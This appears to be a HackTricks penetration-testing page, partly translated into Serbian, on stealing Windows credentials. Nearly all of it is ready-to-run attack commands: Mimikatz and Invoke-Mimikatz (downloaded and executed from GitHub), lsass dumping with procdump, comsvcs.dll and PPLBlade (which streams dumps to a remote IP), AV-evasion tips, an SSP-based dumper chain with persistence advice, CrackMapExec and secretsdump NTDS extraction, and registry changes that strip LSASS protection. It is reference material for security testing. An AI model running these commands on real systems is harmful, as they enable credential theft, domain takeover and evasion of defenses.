# Krađa Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke kredencijale.**

## Kredencijali sa Meterpreter

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da **pretražite lozinke i heševe** na sistemu žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV

### Procdump + Mimikatz

Pošto **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitiman Microsoft alat**, nije ga Defender detektovao.\
Možete koristiti ovaj alat da **dump the lsass process**, **download the dump** i **extract** **credentials locally** iz dump-a.

Takođe možete koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se radi automatski sa [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu da označe kao **maliciozno** korišćenje **procdump.exe to dump lsass.exe**, zato što detektuju stringove **"procdump.exe" and "lsass.exe"**. Zato je **neupadljivije** da se kao **argument** prosledi **PID** procesa lsass.exe procdump-u umesto imena **lsass.exe**.

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass pomoću Task Manager-a**

1. Desni klik na Task Bar i izaberite Task Manager
2. Kliknite na More details
3. U kartici Processes potražite proces "Local Security Authority Process"
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumpovanje lsass pomoću procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je Protected Process Dumper Tool koji podržava obfusciranje memory dump-a i prenos na remote workstations bez zapisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfusciranje memory dump fajlova kako bi se izbegli Defender mehanizmi detekcije zasnovani na potpisima
3. Otpremanje memory dump-a koristeći RAW i SMB metode upload-a bez zapisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon isporučuje trofazni dumper nazvan **LalsDumper** koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na taj API ne pokreću:

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` tražeći placeholder koji se sastoji od 32 mala slova `d`, prepisuje ga apsolutnom putanjom do `rtu.txt`, snima patch-ovan DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. To primorava **LSASS** da učita maliciozni DLL kao novi Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki bajt sa `0x20` i mapira dekodovani blob u memoriju pre nego što prebaci izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** rešene iz hashed API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedicated export pod imenom `Tom` otvara `%TEMP%\<pid>.ddt`, strimuje kompresovani LSASS dump u fajl i zatvara handle tako da eksfiltracija može da se obavi kasnije.

Napomene operatera:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 prepisuje hardkodirani placeholder apsolutnom putanjom do `rtu.txt`, pa razdvajanje fajlova prekida lanac.
* Registracija se vrši dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Možete sami postaviti tu vrednost da bi LSASS ponovo učitao SSP pri svakom bootu.
* `%TEMP%\*.ddt` fajlovi su kompresovani dumpovi. Dekompresujte lokalno, pa ih prosledite Mimikatz/Volatility za izdvajanje kredencijala.
* Pokretanje `lals.exe` zahteva admin/SeTcb privilegije da bi `AddSecurityPackageA` uspeo; kada poziv vrati kontrolu, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ga ne izbacuje iz LSASS-a. Ili obrišite registry unos i restartujte LSASS (reboot) ili ga ostavite za dugotrajnu persistenciju.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit sa ciljanog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izdvojite istoriju lozinki iz NTDS.dit sa ciljanog DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki nalog u NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ove datoteke bi trebalo da se nalaze u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM_. Али **не можете их једноставно копирати на уобичајен начин** јер су заштићене.

### Из регистра

Најлакши начин да добијете копију тих датотека је да их извучете из регистра:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na vašu Kali mašinu i **izdvojite heše** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete napraviti kopiju zaštićenih fajlova koristeći ovu uslugu. Potrebno je да будете Administrator.

#### Korišćenje vssadmin

vssadmin binary je dostupan samo u Windows Server verzijama.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**. Ovo je primer **kako kopirati SAM file** (koristi se hard disk "C:" i fajl se čuva u C:\users\Public), ali ovo možete koristiti za kopiranje bilo kog zaštićenog fajla:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, možete такође користити [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) да направите копију SAM, SYSTEM и ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kredencijali - NTDS.dit**

Datoteka **NTDS.dit** smatra se srcem **Active Directory** — sadrži ključne podatke o objektima korisnika, grupama i njihovom članstvu. Tu se nalaze **password hashes** za korisnike domena. Ova datoteka je **Extensible Storage Engine (ESE)** baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri glavne tabele:

- **Data Table**: Ova tabela čuva detalje o objektima kao što su korisnici i grupe.
- **Link Table**: Beleži veze i odnose, npr. članstva u grupama.
- **SD Table**: **Security descriptors** za svaki objekat se nalaze ovde, obezbeđujući sigurnost i kontrolu pristupa za sačuvane objekte.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a koristi je i _lsass.exe_. Zbog toga deo datoteke **NTDS.dit** može biti lociran **unutar `lsass`** memorije (možete pronaći najskorije pristupljene podatke, verovatno zbog poboljšanja performansi korišćenjem **cache**-a).

#### Dekriptovanje hash-ova unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dekriptovati Password Encryption Key (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dekriptovati hash koristeći **PEK** i **RC4**.
3. Dekriptovati hash koristeći **DES**.

**PEK** ima istu vrednost na svakom domain controller-u, ali je šifrovan unutar **NTDS.dit** datoteke koristeći **BOOTKEY** iz **SYSTEM** fajla domain controller-a (koji se razlikuje između domain controller-a). Zbog toga, da biste dobili kredencijale iz NTDS.dit datoteke, potrebni su vam fajlovi NTDS.dit i SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeći Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takođe možete koristiti [**volume shadow copy**](#stealing-sam-and-system) trik da kopirate **ntds.dit** fajl. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM** fajla (ponovo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trik).

### **Izdvajanje heševa iz NTDS.dit**

Kada dobijete fajlove **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete heševe**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Možete ih takođe **automatski izdvojiti** koristeći važeći domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit fajlove** preporučuje se da ih ekstrahujete koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Takođe možete koristiti i **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija objekata domena iz NTDS.dit u SQLite bazu**

NTDS objekti mogu biti ekstrahovani u SQLite bazu pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izvlače tajne, već i čitavi objekti i njihovi atributi za dalje dobijanje informacija kada je sirovi NTDS.dit fajl već pribavljen.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opciona, ali omogućava dešifrovanje tajni (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Zajedno sa drugim informacijama, izdvaja se sledeći skup podataka: korisnički i mašinski nalozi sa njihovim hash-ovima, UAC flags, timestamp poslednjeg logona i password change, opisi naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo i članstva organizacionih jedinica, trusted domains sa tipom trusts, smerom i atributima...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju credentials iz više softvera.
```
lazagne.exe all
```
## Ostali alati za izvlačenje kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvlači kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvucite credentials iz SAM fajla
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo **pokrenite ga** i lozinke će biti izvučene.

## Istraživanje neaktivnih RDP sesija i slabljenje sigurnosnih kontrola

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style prikupljanje telemetrije

* **Outbound RDP targets** – parsirajte svaki korisnički hive na `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ čuva ime servera, `UsernameHint`, i timestamp poslednjeg zapisa. Možete replicirati FinalDraft-ovu logiku pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – pretražite `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log za Event ID-ove **21** (successful logon) i **25** (disconnect) da mapirate ko je administrirao mašinu:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada znate koji Domain Admin redovno konektuje, dump-ujte LSASS (sa LalsDumper/Mimikatz) dok im **disconnected** sesija još postoji. CredSSP + NTLM fallback ostavljaju njihov verifier i tokene u LSASS, koje potom mogu biti replay-ovane preko SMB/WinRM da se dohvati `NTDS.dit` ili da se postavi persistence na domain controller-ima.

### Registry downgrade-ovi na koje cilja FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Postavljanje `DisableRestrictedAdmin=1` prisiljava potpunu credential/ticket reuse tokom RDP-a, omogućavajući pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC token filtering, pa local admins dobijaju unrestricted tokens preko mreže.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC online, pružajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL protections, čineći pristup memoriji trivijalnim za dumpere kao što je LalsDumper.

## Reference

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
